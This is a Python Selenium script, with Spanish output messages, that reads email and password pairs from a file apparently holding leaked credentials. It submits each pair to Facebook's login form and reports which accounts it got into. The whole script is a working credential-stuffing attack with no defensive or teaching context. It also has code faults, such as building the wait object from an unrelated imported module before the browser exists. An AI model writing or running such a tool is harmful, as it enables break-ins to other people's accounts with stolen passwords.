from distutils.log import Log
from lib2to3.pgen2 import driver
from time import sleep
from xml.dom.minidom import Element
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

BD = open("Filtrados.txt","r").read()
lines = BD.splitlines()

Wait5 = WebDriverWait(driver,5)
driver = webdriver.Chrome(executable_path="./chromedriver")
driver.maximize_window()
driver.get("https://www.facebook.com/")

LoginSuccess=0
LoginUnsuccess=0
for i in range(0,len(lines),2):
    email=lines[i]
    psw=lines[i+1]
    driver.find_element(By.XPATH,"//*[@id='email']").send_keys(email)
    driver.find_element(By.XPATH,"//*[@id='pass']").send_keys(psw)
    driver.find_element(By.NAME,"login").click()
    Login = True
    try: 
        driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[1]/div[1]/div/div[1]/div/div/div[1]/div/div/div[1]/ul/li/div/a")
    except NoSuchElementException:
        Login = False
    if Login:
        LoginSuccess+=1
        print("Inicio de Sesion logrado con: ",email)
        driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[1]/span/div/div[1]/svg").click()
        element = Wait5.until(EC.element_to_be_clickable((By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[2]/div/div[2]/div[1]/div[1]/div/div/div/div/div/div/div/div/div[1]/div/div/div[1]/div[3]/div/div[4]/div/div[1]/div[2]/div/div/div/div/span")))
        driver.find_element(By.XPATH,"/html/body/div[1]/div/div[1]/div/div[2]/div[4]/div[2]/div/div[2]/div[1]/div[1]/div/div/div/div/div/div/div/div/div[1]/div/div/div[1]/div[3]/div/div[4]/div/div[1]/div[2]/div/div/div/div/span").click()

    else:
        LoginUnsuccess+=1
        print("No se logro en login con: ",email)
        driver.get("https://www.facebook.com/")

driver.quit()

print("Se obtuvieron ",LoginSuccess," inicios de sesion exitosos.")
print("Se obtuvieron ",LoginUnsuccess," inicios de sesion fallidos.")

